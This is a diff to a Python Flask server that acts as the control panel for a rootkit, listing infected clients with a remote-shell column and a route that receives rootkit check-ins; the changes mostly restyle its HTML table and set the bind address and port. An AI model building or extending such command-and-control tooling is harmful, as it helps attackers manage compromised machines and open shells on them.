@@ -3,6 +3,8 @@ import datetime
 from base64 import b64decode, b64encode
 
 DEBUG = False
+SERVER_IP = "192.168.1.40"
+SERVER_PORT = 12345
 SHELL_IP = "192.168.1.40"#"127.0.0.1"
 
 app = Flask(__name__)
@@ -45,24 +47,70 @@ def hello():
     content = """<html>
     <head>
     <style>
-        table, th, td {
-            border: 1px solid black;
+        table.blueTable {
+            font-family: Arial, Helvetica, sans-serif;
+            border: 1px solid #1C6EA4;
+            background-color: #EEEEEE;
+            width: 100%;
+            text-align: center;
             border-collapse: collapse;
         }
+        table.blueTable td, table.blueTable th {
+            border: 1px solid #AAAAAA;
+            padding: 3px 2px;
+        }
+        table.blueTable tbody td {
+            font-size: 13px;
+        }
+        table.blueTable tr:nth-child(even) {
+            background: #D0E4F5;
+        }
+        table.blueTable thead {
+            background: #1C6EA4;
+            background: -moz-linear-gradient(top, #5592bb 0%, #327cad 66%, #1C6EA4 100%);
+            background: -webkit-linear-gradient(top, #5592bb 0%, #327cad 66%, #1C6EA4 100%);
+            background: linear-gradient(to bottom, #5592bb 0%, #327cad 66%, #1C6EA4 100%);
+            border-bottom: 2px solid #444444;
+        }
+        table.blueTable thead th {
+            font-size: 15px;
+            font-weight: bold;
+            color: #FFFFFF;
+            text-align: center;
+            border-left: 2px solid #D0E4F5;
+        }
+        table.blueTable thead th:first-child {
+            border-left: none;
+        }
+
+        table.blueTable tfoot td {
+            font-size: 14px;
+        }
+        table.blueTable tfoot .links {
+            text-align: right;
+        }
+        table.blueTable tfoot .links a{
+            display: inline-block;
+            background: #1C6EA4;
+            color: #FFFFFF;
+            padding: 2px 8px;
+            border-radius: 5px;
+        }
+
     </style>
     </head>
     <body>
     <h1>Welcome daddy</h1>
-    <table><tr>"""
+    <table class=blueTable><thead><tr>"""
     for key in list(ClientDatas.values())[0].__dict__.keys():
-        content += "<td>%s</td>" % key.title()
-    content += "<td>Shell</td>"
-    content += "</tr>"
+        content += "<th>%s</th>" % key.title()
+    content += "<th>Shell</th>"
+    content += "</tr></thead><tbody>"
     
     for c in ClientDatas.values():
         content += c.get_row()
     
-    content += "</table></body></html>"
+    content += "</tbody></table></body></html>"
     return content
 
 # Rootkit posts here, updates data in server and checks
@@ -90,4 +138,4 @@ def shell():
     return redirect("/")
 
 if __name__ == '__main__':
-    app.run(port=12345, debug=DEBUG)
+    app.run(host=SERVER_IP, port=SERVER_PORT, debug=DEBUG)
